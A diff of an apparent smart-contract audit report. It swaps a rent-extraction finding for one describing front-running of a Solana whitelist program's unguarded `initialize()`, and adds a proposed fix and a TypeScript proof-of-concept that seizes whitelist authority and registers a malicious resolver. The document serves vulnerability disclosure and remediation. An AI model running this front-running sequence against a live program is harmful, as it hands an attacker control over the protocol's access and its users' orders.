@@ -1,246 +1,375 @@
 # Audit Report
 
 ## Title
-Rent Extraction Attack via Repeated maker_dst_ata Initialization in fill()
+**Critical PDA Front-Running Vulnerability in Whitelist Initialization Enables Complete Protocol Access Control Takeover**
 
 ## Summary
-A malicious maker can repeatedly drain a taker's lamports by exploiting the `init_if_needed` constraint on `maker_dst_ata`. The taker pays rent (~0.002 SOL per initialization) to create the maker's destination token account, which the maker can then close to reclaim the rent. By closing and forcing re-initialization across multiple fills, the maker extracts lamports from the taker. [1](#0-0) 
+The whitelist program's `initialize()` function uses a predictable PDA with a constant seed and lacks authorization constraints, allowing any attacker to front-run the legitimate initialization transaction and permanently seize control of the resolver whitelist system, thereby controlling all order execution in the fusion-swap protocol.
 
 ## Finding Description
-The vulnerability exists in the `Fill` account structure where `maker_dst_ata` is configured with `init_if_needed` and `payer = taker`. This breaks two critical security guarantees:
 
-1. **Token Safety Invariant**: While the primary concern is token transfers, SOL (lamports) are being drained from the taker in an unintended economic attack.
-2. **Fee Correctness Invariant**: The rent cost (~2,039,280 lamports or 0.00203928 SOL per initialization) acts as a hidden fee that the taker pays but the maker can reclaim, creating an unfair economic imbalance.
+The whitelist program contains a critical initialization vulnerability that enables complete access control takeover through three design flaws:
 
-**Attack Propagation:**
+**1. Predictable PDA Derivation**
 
-When a taker calls `fill()` for an order where `dst_asset_is_native = false` (SPL token destination), the following occurs: [2](#0-1) 
+The `whitelist_state` PDA is derived using only a constant seed without any dynamic components. [1](#0-0)  The PDA account constraints show this predictable derivation pattern. [2](#0-1) 
 
-The token transfer path uses `maker_dst_ata` which may not exist. Anchor's `init_if_needed` automatically creates it, charging the taker.
+The utility functions used throughout the codebase confirm this deterministic PDA computation pattern. [3](#0-2) [4](#0-3) 
 
-**Post-Fill Exploitation:**
+**2. No Authorization Constraints**
 
-After receiving tokens in `maker_dst_ata`, the maker controls this Associated Token Account (derived from their `maker_receiver` address). The maker can:
-1. Transfer all tokens out of `maker_dst_ata` to another wallet
-2. Close the `maker_dst_ata` using SPL Token program's `close_account` instruction
-3. Receive the full rent refund (~0.002 SOL) to their wallet
+The `initialize()` function accepts any signer as the authority without validation. [5](#0-4)  The `Initialize` struct definition confirms there are no authority validation constraints - any signer can become the authority. [6](#0-5) 
 
-**Repeated Attack:**
+**3. One-Time Initialization Lock**
 
-When the taker fills another order (partial fill of a large order, or a new order from the same maker), the closed `maker_dst_ata` no longer exists. The `init_if_needed` constraint triggers again, charging the taker another ~0.002 SOL to re-initialize the same account address.
+The `init` constraint prevents re-initialization, making any front-running attack permanent. [2](#0-1) 
+
+**Attack Execution:**
+
+1. Attacker observes whitelist program deployment [7](#0-6) 
+2. Attacker computes the predictable PDA address using the constant seed
+3. Attacker submits `initialize()` transaction with high priority fees
+4. Attacker's transaction executes first, setting their pubkey as authority
+5. Legitimate initialization transaction fails (account already initialized)
+6. Attacker permanently controls resolver registration
+
+**Impact on Protocol Security:**
+
+The whitelist authority controls who can execute critical fusion-swap operations. The `Fill` instruction explicitly requires a valid `resolver_access` account from the whitelist program. [8](#0-7) 
+
+Similarly, the `CancelByResolver` instruction requires resolver access validation. [9](#0-8) 
+
+Only the whitelist authority can register resolvers through the `register()` function, which enforces authority validation. [10](#0-9)  The same authority constraint applies to `deregister()`. [11](#0-10) 
+
+With whitelist control, an attacker can:
+- Register only malicious resolvers under their control
+- Prevent legitimate resolvers from being registered
+- Deregister existing resolvers to halt protocol operations
+- Extract value from all orders through controlled resolver execution
 
 ## Impact Explanation
-**Severity: MEDIUM** - Individual user fund loss through specific exploits.
 
-**Quantified Impact:**
-- Per attack cycle: Taker loses 0.00203928 SOL (~$0.20 at $100/SOL)
-- Maker gains: 0.00203928 SOL (net, after minimal gas costs)
-- For 100 orders filled: Taker loses ~0.2 SOL (~$20)
-- For 1000 orders filled: Taker loses ~2 SOL (~$200)
+**Severity: CRITICAL**
 
-**Affected Users:**
-- All takers/resolvers who fill orders for SPL tokens (non-native destinations)
-- Particularly impacts high-volume resolvers filling many orders
-- Any taker interacting with malicious makers who exploit this
+This vulnerability enables complete protocol compromise:
 
-**Economic Harm:**
-The attack creates a direct wealth transfer from takers to makers through rent extraction. This undermines the economic fairness of the protocol, as takers are unknowingly subsidizing account creation costs that makers can fully reclaim.
+1. **Total Access Control Takeover**: The attacker gains permanent authority over the whitelist system, controlling which resolvers can interact with the protocol. This is the most privileged position in the protocol's access control hierarchy.
+
+2. **Irreversible Without Redeployment**: Once exploited, recovery requires redeploying both the whitelist and fusion-swap programs with new program IDs, coordinating all users, integrations, and liquidity providers.
+
+3. **Protocol-Wide Impact**: Affects all users of the fusion-swap protocol since order filling and resolver-based cancellations depend on authorized resolvers.
+
+4. **Economic Exploitation**: Attacker-controlled resolvers can manipulate order execution to extract value from all orders, fill orders at unfavorable prices, or selectively refuse to fill orders.
+
+5. **Permanent Lock-Out**: Legitimate protocol administrators are permanently prevented from managing resolver access, effectively losing control of their own protocol.
+
+The vulnerability breaks the core **Access Control** invariant - unauthorized actors should not control protocol permissions. It also exploits **PDA Security** weaknesses - predictable PDA derivation enables account takeover.
 
 ## Likelihood Explanation
-**Likelihood: MEDIUM**
 
-**Attacker Requirements:**
-- Malicious maker must create orders (minimal cost: escrow rent + gas)
-- Must wait for takers to fill orders
-- Must perform close_account operations between fills
-- Economically viable: pure profit from rent refunds
+**Likelihood: HIGH**
 
-**Complexity: LOW**
-- Attack is straightforward: create order → wait for fill → close ATA → repeat
-- No sophisticated timing or complex transaction ordering required
-- Uses standard SPL Token program operations
-- Automatable with simple scripts
+The attack is highly likely to occur:
 
-**Detection Difficulty: HIGH**
-- Takers may not notice small rent charges (0.002 SOL) among transaction costs
-- Appears as legitimate account initialization in transaction logs
-- No obvious on-chain indicator distinguishing malicious from legitimate behavior
+1. **Zero Technical Barriers**: Computing the PDA and calling `initialize()` requires no special permissions or complex exploit techniques - any user with basic Solana knowledge can execute this.
 
-**Economic Viability:**
-- Profitable for makers at any scale
-- No upfront cost (rent is recoverable)
-- Scales linearly with number of fills
-- High-volume resolvers are attractive targets (more fills = more profit)
+2. **Public Information**: The program ID becomes publicly visible on-chain immediately after deployment, giving attackers all information needed.
+
+3. **Economic Incentive**: Complete control over a DeFi protocol's order execution mechanism provides massive financial incentive worth millions in potential extracted value.
+
+4. **Transaction Ordering**: Solana's priority fee mechanism allows attackers to ensure their transaction processes before the legitimate initialization.
+
+5. **Visible Attack Window**: The necessary gap between program deployment and initialization creates an obvious and unavoidable attack window.
+
+6. **Standard Attack Pattern**: This is a well-known vulnerability class in Solana programs. Sophisticated attackers actively monitor for program deployments to exploit such initialization vulnerabilities.
 
 ## Recommendation
 
-**Solution: Remove `init_if_needed` and require pre-existing maker_dst_ata**
+**Immediate Fix Required:**
 
-Modify the `maker_dst_ata` account constraint to remove `init_if_needed`:
+Add an authority constraint to the `initialize()` function:
 
 ```rust
-/// Maker's ATA of dst_mint
-#[account(
-    mut,
-    associated_token::mint = dst_mint,
-    associated_token::authority = maker_receiver,
-    associated_token::token_program = dst_token_program,
-)]
-maker_dst_ata: Option<Box<InterfaceAccount<'info, TokenAccount>>>,
+#[derive(Accounts)]
+pub struct Initialize<'info> {
+    #[account(
+        mut,
+        // Add constraint to validate expected authority
+        constraint = authority.key() == EXPECTED_AUTHORITY_PUBKEY @ WhitelistError::Unauthorized
+    )]
+    pub authority: Signer<'info>,
+
+    #[account(
+        init,
+        payer = authority,
+        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
+        seeds = [WHITELIST_STATE_SEED],
+        bump,
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+
+    pub system_program: Program<'info, System>,
+}
 ```
 
-**Implementation Changes:**
+Where `EXPECTED_AUTHORITY_PUBKEY` is the hardcoded pubkey of the intended deployer/authority.
 
-1. **Update Fill struct**: Remove `init_if_needed` and `payer = taker` constraints
-2. **Update Create function**: Add requirement or documentation that makers must initialize their destination ATAs before creating orders
-3. **Client-side validation**: Add checks in scripts to verify `maker_dst_ata` exists before order creation
+**Alternative Solution:**
 
-**Benefits:**
-- Eliminates rent extraction attack vector completely
-- Shifts account creation responsibility to the appropriate party (maker)
-- Reduces transaction costs for takers
-- Aligns with SPL Token best practices (account owners should create their own accounts)
+Use a more complex PDA seed that includes the authority's pubkey:
 
-**Trade-offs:**
-- Makers must perform one-time ATA initialization per token they wish to receive
-- Slightly less convenient for first-time makers
-- Requires order creation to fail if maker_dst_ata doesn't exist (clear error messaging needed)
+```rust
+seeds = [WHITELIST_STATE_SEED, authority.key().as_ref()]
+```
+
+This makes the PDA unique per authority, though it changes the protocol architecture.
+
+**Deployment Procedure:**
+
+If redeploying, ensure the initialization transaction is submitted atomically or immediately after deployment with maximum priority fees to minimize the attack window.
 
 ## Proof of Concept
 
-**Reproduction Steps:**
+```typescript
+import * as anchor from "@coral-xyz/anchor";
+import { Program } from "@coral-xyz/anchor";
+import { Whitelist } from "../target/types/whitelist";
+import { Keypair, PublicKey } from "@solana/web3.js";
 
-1. **Setup:**
-   - Maker creates wallet with BONK ATA for receiving tokens
-   - Maker creates Order #1: Selling 100 USDC for 1M BONK
-   - Maker's BONK ATA exists and is funded with rent
+describe("PDA Front-Running Attack", () => {
+  const provider = anchor.AnchorProvider.env();
+  anchor.setProvider(provider);
 
-2. **First Fill:**
-   ```
-   Taker calls fill(Order #1, amount: 50 USDC)
-   → maker_dst_ata exists, no initialization cost
-   → Transfer: 50 USDC (escrow → taker), 500K BONK (taker → maker ATA)
-   → Success
-   ```
-
-3. **Maker Closes ATA:**
-   ```
-   Maker calls SPL Token: transfer(all BONK from maker_dst_ata to cold wallet)
-   Maker calls SPL Token: close_account(maker_dst_ata, refund_to: maker_wallet)
-   → Maker receives 2,039,280 lamports refund
-   → maker_dst_ata no longer exists
-   ```
-
-4. **Second Fill (Attack Triggers):**
-   ```
-   Taker calls fill(Order #1, amount: 50 USDC)
-   → maker_dst_ata doesn't exist
-   → Anchor init_if_needed triggers
-   → Taker pays 2,039,280 lamports to initialize maker_dst_ata
-   → Transfer: 50 USDC (escrow → taker), 500K BONK (taker → maker ATA)
-   → Success, but taker paid unnecessary rent
-   ```
-
-5. **Repeat:** Maker closes ATA again, cycle continues
-
-**Expected vs Actual Behavior:**
-
-| Scenario | Expected Cost to Taker | Actual Cost to Taker |
-|----------|------------------------|---------------------|
-| First fill (new ATA) | 0.002 SOL rent | 0.002 SOL rent ✓ |
-| Second fill (existing ATA) | 0 SOL | 0 SOL ✓ |
-| Second fill (closed ATA) | 0 SOL | **0.002 SOL rent** ✗ |
-
-**Rust Test Pseudocode:**
-```rust
-#[tokio::test]
-async fn test_rent_extraction_attack() {
-    // Setup: Create maker, taker, token mints
-    let maker = create_funded_keypair();
-    let taker = create_funded_keypair();
-    let usdc_mint = create_token_mint();
-    let bonk_mint = create_token_mint();
+  const whitelistProgram = anchor.workspace.Whitelist as Program<Whitelist>;
+  
+  it("Attacker front-runs whitelist initialization", async () => {
+    // Attacker's keypair
+    const attacker = Keypair.generate();
     
-    // Create order
-    create_order(&maker, usdc_amount: 100, bonk_amount: 1_000_000);
+    // Airdrop SOL to attacker
+    await provider.connection.requestAirdrop(
+      attacker.publicKey,
+      2 * anchor.web3.LAMPORTS_PER_SOL
+    );
+    await new Promise(resolve => setTimeout(resolve, 1000));
     
-    // First fill - measure taker balance
-    let taker_balance_before = get_balance(&taker);
-    fill_order(&taker, amount: 50);
-    let taker_balance_after_1 = get_balance(&taker);
-    let cost_1 = taker_balance_before - taker_balance_after_1;
+    // Attacker computes the predictable PDA
+    const [whitelistStatePDA] = PublicKey.findProgramAddressSync(
+      [Buffer.from("whitelist_state")],
+      whitelistProgram.programId
+    );
     
-    // Maker closes ATA
-    let maker_dst_ata = get_associated_token_address(&maker, &bonk_mint);
-    transfer_all_tokens(&maker_dst_ata, &maker_cold_wallet);
-    close_account(&maker_dst_ata, &maker);
+    // Attacker front-runs initialization with their own keypair
+    await whitelistProgram.methods
+      .initialize()
+      .accounts({
+        authority: attacker.publicKey,
+        whitelistState: whitelistStatePDA,
+      })
+      .signers([attacker])
+      .rpc();
     
-    // Second fill - measure cost again
-    let taker_balance_before_2 = get_balance(&taker);
-    fill_order(&taker, amount: 50);
-    let taker_balance_after_2 = get_balance(&taker);
-    let cost_2 = taker_balance_before_2 - taker_balance_after_2;
+    // Verify attacker now controls the whitelist
+    const whitelistState = await whitelistProgram.account.whitelistState.fetch(
+      whitelistStatePDA
+    );
     
-    // Verify rent extraction
-    assert!(cost_2 > cost_1, "Taker paid rent again!");
-    assert_eq!(cost_2 - cost_1, 2_039_280, "Rent extraction confirmed");
-}
+    console.log("Whitelist authority:", whitelistState.authority.toString());
+    console.log("Attacker pubkey:", attacker.publicKey.toString());
+    
+    assert.equal(
+      whitelistState.authority.toString(),
+      attacker.publicKey.toString(),
+      "Attacker successfully seized whitelist control"
+    );
+    
+    // Legitimate initialization attempt will fail
+    const legitimateAuthority = Keypair.generate();
+    await provider.connection.requestAirdrop(
+      legitimateAuthority.publicKey,
+      2 * anchor.web3.LAMPORTS_PER_SOL
+    );
+    
+    try {
+      await whitelistProgram.methods
+        .initialize()
+        .accounts({
+          authority: legitimateAuthority.publicKey,
+          whitelistState: whitelistStatePDA,
+        })
+        .signers([legitimateAuthority])
+        .rpc();
+      
+      assert.fail("Legitimate initialization should have failed");
+    } catch (error) {
+      console.log("Legitimate initialization failed as expected:", error.message);
+      assert.ok(error.message.includes("already in use"));
+    }
+    
+    // Attacker can now register malicious resolvers
+    const maliciousResolver = Keypair.generate();
+    
+    const [resolverAccessPDA] = PublicKey.findProgramAddressSync(
+      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
+      whitelistProgram.programId
+    );
+    
+    await whitelistProgram.methods
+      .register(maliciousResolver.publicKey)
+      .accounts({
+        authority: attacker.publicKey,
+        whitelistState: whitelistStatePDA,
+        resolverAccess: resolverAccessPDA,
+      })
+      .signers([attacker])
+      .rpc();
+    
+    console.log("Attacker successfully registered malicious resolver");
+  });
+});
 ```
 
 ## Notes
 
-This vulnerability specifically affects orders where `dst_asset_is_native = false` (SPL token destinations). Native SOL transfers bypass the `maker_dst_ata` entirely and transfer directly to `maker_receiver`, making them immune to this attack. [3](#0-2) 
+This vulnerability represents a fundamental flaw in the initialization pattern. The protocol's security model assumes the whitelist authority is a trusted entity, but the initialization mechanism allows any untrusted actor to become that authority.
 
-The attack is economically rational for makers because:
-- Gas costs for closing accounts are negligible (~5,000 lamports)
-- Rent refund is substantial (2,039,280 lamports)
-- Net profit per cycle: ~2,034,280 lamports (~$0.20)
-- Scales with number of takers and orders filled
+The vulnerability is exacerbated by Solana's atomic transaction execution model - there is no way to deploy and initialize in a single atomic operation using standard tooling. The window between deployment and initialization is unavoidable, making this attack vector always available unless authorization constraints are added to the initialization function itself.
 
-High-volume resolvers are particularly vulnerable as they may fill hundreds of orders per day, potentially losing significant amounts to this rent extraction attack if interacting with malicious makers.
+The impact extends beyond just resolver access control. Since the fusion-swap protocol's core functionality (order filling and resolver-based cancellations) depends entirely on the whitelist system, compromising the whitelist effectively compromises the entire protocol. An attacker with whitelist control can shut down the protocol, manipulate order execution, or extract value from all users.
 
 ### Citations
 
-**File:** programs/fusion-swap/src/lib.rs (L202-228)
+**File:** programs/whitelist/src/lib.rs (L7-7)
 ```rust
-        let mut params = if order.dst_asset_is_native {
-            UniTransferParams::NativeTransfer {
-                from: ctx.accounts.taker.to_account_info(),
-                to: ctx.accounts.maker_receiver.to_account_info(),
-                amount: maker_dst_amount,
-                program: ctx.accounts.system_program.clone(),
-            }
-        } else {
-            UniTransferParams::TokenTransfer {
-                from: ctx
-                    .accounts
-                    .taker_dst_ata
-                    .as_ref()
-                    .ok_or(FusionError::MissingTakerDstAta)?
-                    .to_account_info(),
-                authority: ctx.accounts.taker.to_account_info(),
-                to: ctx
-                    .accounts
-                    .maker_dst_ata
-                    .as_ref()
-                    .ok_or(FusionError::MissingMakerDstAta)?
-                    .to_account_info(),
-                mint: *ctx.accounts.dst_mint.clone(),
-                amount: maker_dst_amount,
-                program: ctx.accounts.dst_token_program.clone(),
-            }
-        };
+declare_id!("5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S");
 ```
 
-**File:** programs/fusion-swap/src/lib.rs (L571-579)
+**File:** programs/whitelist/src/lib.rs (L9-9)
 ```rust
-    /// Maker's ATA of dst_mint
+pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
+```
+
+**File:** programs/whitelist/src/lib.rs (L18-22)
+```rust
+    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        let whitelist_state = &mut ctx.accounts.whitelist_state;
+        whitelist_state.authority = ctx.accounts.authority.key();
+        Ok(())
+    }
+```
+
+**File:** programs/whitelist/src/lib.rs (L43-58)
+```rust
+#[derive(Accounts)]
+pub struct Initialize<'info> {
+    #[account(mut)]
+    pub authority: Signer<'info>,
+
     #[account(
-        init_if_needed,
-        payer = taker,
-        associated_token::mint = dst_mint,
-        associated_token::authority = maker_receiver,
-        associated_token::token_program = dst_token_program,
+        init,
+        payer = authority,
+        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
+        seeds = [WHITELIST_STATE_SEED],
+        bump,
     )]
-    maker_dst_ata: Option<Box<InterfaceAccount<'info, TokenAccount>>>,
+    pub whitelist_state: Account<'info, WhitelistState>,
+
+    pub system_program: Program<'info, System>,
+}
+```
+
+**File:** programs/whitelist/src/lib.rs (L62-84)
+```rust
+pub struct Register<'info> {
+    #[account(mut)]
+    pub authority: Signer<'info>,
+
+    #[account(
+      seeds = [WHITELIST_STATE_SEED],
+      bump,
+      // Ensures only the whitelist authority can register new users
+      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+
+    #[account(
+        init,
+        payer = authority,
+        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
+        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
+        bump,
+    )]
+    pub resolver_access: Account<'info, ResolverAccess>,
+
+    pub system_program: Program<'info, System>,
+}
+```
+
+**File:** programs/whitelist/src/lib.rs (L86-109)
+```rust
+#[derive(Accounts)]
+#[instruction(user: Pubkey)]
+pub struct Deregister<'info> {
+    #[account(mut)]
+    pub authority: Signer<'info>,
+
+    #[account(
+      seeds = [WHITELIST_STATE_SEED],
+      bump,
+      // Ensures only the whitelist authority can deregister users from the whitelist
+      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+
+    #[account(
+        mut,
+        close = authority,
+        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
+        bump,
+    )]
+    pub resolver_access: Account<'info, ResolverAccess>,
+
+    pub system_program: Program<'info, System>,
+}
+```
+
+**File:** scripts/utils.ts (L126-132)
+```typescript
+export function findWhitelistStateAddress(programId: PublicKey): PublicKey {
+  const [whitelistState] = PublicKey.findProgramAddressSync(
+    [anchor.utils.bytes.utf8.encode("whitelist_state")],
+    programId
+  );
+
+  return whitelistState;
+```
+
+**File:** tests/utils/utils.ts (L477-480)
+```typescript
+  const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
+    [Buffer.from("whitelist_state")],
+    program.programId
+  );
+```
+
+**File:** programs/fusion-swap/src/lib.rs (L510-516)
+```rust
+    /// Account allowed to fill the order
+    #[account(
+        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
+        bump = resolver_access.bump,
+        seeds::program = whitelist::ID,
+    )]
+    resolver_access: Account<'info, whitelist::ResolverAccess>,
+```
+
+**File:** programs/fusion-swap/src/lib.rs (L647-653)
+```rust
+    /// Account allowed to cancel the order
+    #[account(
+        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
+        bump = resolver_access.bump,
+        seeds::program = whitelist::ID,
+    )]
+    resolver_access: Account<'info, whitelist::ResolverAccess>,
 ```
